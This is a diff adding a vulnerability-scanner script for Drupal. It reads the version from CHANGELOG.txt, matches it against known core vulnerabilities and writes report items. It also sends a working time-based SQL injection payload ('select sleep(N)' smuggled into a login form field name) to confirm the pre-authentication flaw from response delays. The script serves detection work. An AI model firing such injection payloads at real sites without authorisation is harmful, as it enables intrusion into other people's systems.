@@ -1,0 +1,158 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+#include versioning_helpers.inc;
+#include drupal_vulns_core.inc;
+var lastJob = null;
+var alertedSQLinj = false;
+// **************************************************************************************							 
+function alert(uri, vxml, job, details)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	if (details) ri.details = details;
+	ri.setHttpInfo(job);
+	AddReportItem(ri);	
+}
+// **************************************************************************************
+function alert2(uri, version, minVer, maxVer, title, descr, ref1, ref2, ref3, ref4, ref5, cve, cwe, cvss, cvss3, recomm, request, response)
+{
+    if (uri == '//') uri='/';
+    var ri = new TReportItem();
+    ri.severity = 'high';
+    ri.affects = uri;
+    ri.alertPath = "Scripts/Drupal vulns";
+    // alert info
+    ri.name = title;
+    ri.description = descr;
+    ri.recommendation = recomm;
+    ri.request = request;
+    ri.response = response;
+    ri.impact = "The impact of this vulnerability is not available.";
+    // alert details
+    ri.details = "Current Drupal version: [dark]" + version + "[/dark].[break]";
+    if (minVer != maxVer) ri.details = ri.details + "Drupal versions between [bold]" + minVer + "[/bold] and [bold]" + maxVer + "[/bold] are affected." ;
+    else ri.details = ri.details + "Drupal version [bold]" + minVer + "[/bold] is affected.";
+    // references
+    if (ref1 != '')
+        ri.addReference(ref1, ref1);
+    if (ref2 != '')
+        ri.addReference(ref2, ref2);
+    if (ref3 != '')
+        ri.addReference(ref3, ref3);
+    if (ref4 != '')
+        ri.addReference(ref4, ref4);
+    if (ref5 != '')
+        ri.addReference(ref5, ref5);
+    // scores
+    ri.CVE = cve;
+    ri.CWE = cwe;
+		
+    ri.CVSSscore = cvss;
+    ri.CVSS3 = cvss3;
+    AddReportItem(ri);
+}
+// **************************************************************************************							 
+function testDrupalSQLIPreAuth(dir, drupalDir, timeToSleep) {
+	lastJob = new THTTPJob();
+	lastJob.url = dir.url;
+	lastJob.verb = 'POST';
+	lastJob.uri = drupalDir + '?q=node&destination=node';
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	lastJob.addCookies = false;
+	lastJob.request.body = 'name[0+;select+sleep(' + timeToSleep + ');;#++]=acu&name[0]=netix&pass=acu&test2=netix&form_build_id=&form_id=user_login_block&op=Log+in';
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{return lastJob.responseDuration;}
+	else return 0
+}
+// **************************************************************************************							 
+function extractVersionFromString(strVer) 
+{
+	strVer = strVer.replace(".", "").replace(".", "").replace(".", "").replace(".", "");
+	
+	if (strVer.length == 1) strVer = strVer + "000";
+	else if (strVer.length == 2) strVer = strVer + "00";
+	else if (strVer.length == 3) strVer = strVer + "0";
+		
+	return parseInt(strVer);			
+}
+// **************************************************************************************							 
+function checkDrupalVersion(dir, drupalDir) {
+	lastJob = new THTTPJob();
+	lastJob.url = dir.url;
+	lastJob.verb = 'GET';
+	lastJob.uri = drupalDir + 'CHANGELOG.txt';
+	lastJob.addCookies = false;
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound && lastJob.response.body.indexOf("Drupal ") != -1) 
+	{
+	    m = /Drupal\s([\d\.]+)\,/.exec(lastJob.response.body);
+	    if (m && m[1]) {
+	    	var versionStr = m[1];
+				
+	    	versionInt = extractVersionFromString(versionStr);
+	    	
+	    	if (!alertedSQLinj && versionInt>7000 && versionInt<7320) {
+	    		var details = "Current Drupal version: [dark][bold]" + versionStr + "[/bold][/dark]";
+	    		alert(drupalDir, 'drupal_731_core_sql_injection.xml', lastJob, details);
+	    	}
+            // Drupal core vulnerabilities
+            if (versionStr != "") {
+                for (var i=0; i<vulns.length; i++) {
+                    var minVersion = vulns[i][1];
+                    var maxVersion = vulns[i][2];
+                    if (version_compare(versionStr, minVersion, '>=') && version_compare(versionStr, maxVersion, '<=')) {
+                        // prepare alert details
+                        var title = (vulns[i][0]);
+                        var descr = vulns[i][3];
+                        var ref1 = vulns[i][4];
+                        var ref2 = vulns[i][5];
+                        var ref3 = vulns[i][6];
+                        var ref4 = vulns[i][7];
+                        var ref5 = vulns[i][8];
+                        var cve = vulns[i][9];
+                        var cwe = vulns[i][10];
+                        if (cwe.indexOf(",") != -1) {
+                            cwe = cwe.split(",")[0].trim();
+                        }
+                        var cvss = vulns[i][11];
+                        var cvss3 = vulns[i][12];
+                        var recomm = vulns[i][13];
+                        if (!recomm.trim().endsWith(".")) recomm = recomm + ".";
+                        alert2(dir.fullPath + "/", versionStr, minVersion, maxVersion, title, descr, ref1, ref2, ref3, ref4, ref5, cve, cwe, cvss, cvss3, recomm, dir.request.toString(), dir.response.headersString);
+                    }
+                }
+            }
+	    }
+	}	
+}
+var dir = getCurrentDirectory();
+var drupalDir = dir.fullPath;
+if (!drupalDir.endsWith("/")) drupalDir = drupalDir + '/';
+var s5 = testDrupalSQLIPreAuth(dir, drupalDir, 5);
+//trace(s5);
+if (s5 > 5000) {
+	var s7 = testDrupalSQLIPreAuth(dir, drupalDir, 7);
+	//trace(s7);
+	if (s7 > 7000 && s7>s5) {
+		var s3 = testDrupalSQLIPreAuth(dir, drupalDir, 3);
+		//trace(s3);
+		if (s3 > 3000 && s3<s5) {
+			var s9 = testDrupalSQLIPreAuth(dir, drupalDir, 9);
+			//trace(s9);
+			if (s9 > 9000 && s9>s7) {
+				//trace('vuln');
+				alert(drupalDir + '?q=node&destination=node', 'drupal_731_core_sql_injection.xml', lastJob);
+				alertedSQLinj = true;
+			}
+		}
+	}
+}
+// look for drupal version
+checkDrupalVersion(dir, drupalDir);
